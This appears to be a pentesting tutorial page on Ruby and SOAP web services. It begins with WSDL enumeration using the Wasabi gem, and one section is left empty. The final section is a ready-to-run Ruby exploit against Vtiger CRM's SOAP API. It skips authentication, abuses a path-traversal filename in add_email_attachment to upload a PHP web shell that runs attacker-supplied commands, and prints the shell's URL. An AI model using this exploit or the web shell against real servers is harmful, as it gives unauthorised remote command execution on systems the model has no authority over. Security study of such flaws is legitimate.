# Interacting with Web Services

### SOAP - WSDL
Generally speaking, dealing with SOAP means dealing with XMLs that which WSDL describes how to use that SOAP. Ruby has really elegant way to do so and let's to get our hand dirty with an exploit

```
gem install wasabi savon httpclient 
```

#### Enumeration

```ruby
require 'wasabi'

url = "http://www.webservicex.net/CurrencyConvertor.asmx?WSDL"

document = Wasabi.document url

# Parsing the document 
document.parser

# SOAP XML
document.xml

# Getting the endpoint 
document.endpoint

# Getting the target namespace
document.namespace

# Enumerate all the SOAP operations/actions
document.operations

# Enumerate input parameters for particular operation
document.operation_input_parameters :conversion_rate

```

#### Interaction 

```ruby

```




#### Hacking via SOAP vulnerabilities 

This is a working exploit for Vtiger CRM SOAP from Auth-bypass to Shell upload 
```ruby
#!/usr/bin/evn ruby
# KING SABRI | @KINGSABRI
# gem install savon httpclient
#
require 'savon'

if ARGV.size < 1
  puts "[+] ruby #{__FILE__} [WSDL URL]"
  exit 0
else
  url = ARGV[0]
end

shell_data, shell_name = "<?php system($_GET['cmd']); ?>", "shell-#{rand(100)}.php"

# Start client 
client = Savon::Client.new(wsdl: url)

# List all avialable operations 
puts "[*] List all available operations "
puts client.operations

puts "\n\n[*] Interact with :add_email_attachment operation"
response = client.call( :add_email_attachment, 
                        message: {
                                     emailid:  rand(100),
                                     filedata: [shell_data].pack("m0"),
                                     filename: "../../../../../../#{shell_name}",
                                     filesize: shell_data.size,
                                     filetype: "php",
                                     username: "KING", 
                                     sessionid: nil
                                }
                      )
puts "[+] PHP Shell on:  http://#{URI.parse(url).host}/vtigercrm/soap/#{shell_name}?cmd=id"

```

More about [Savon][1]










<br><br><br>
---
[1]: http://savonrb.com/

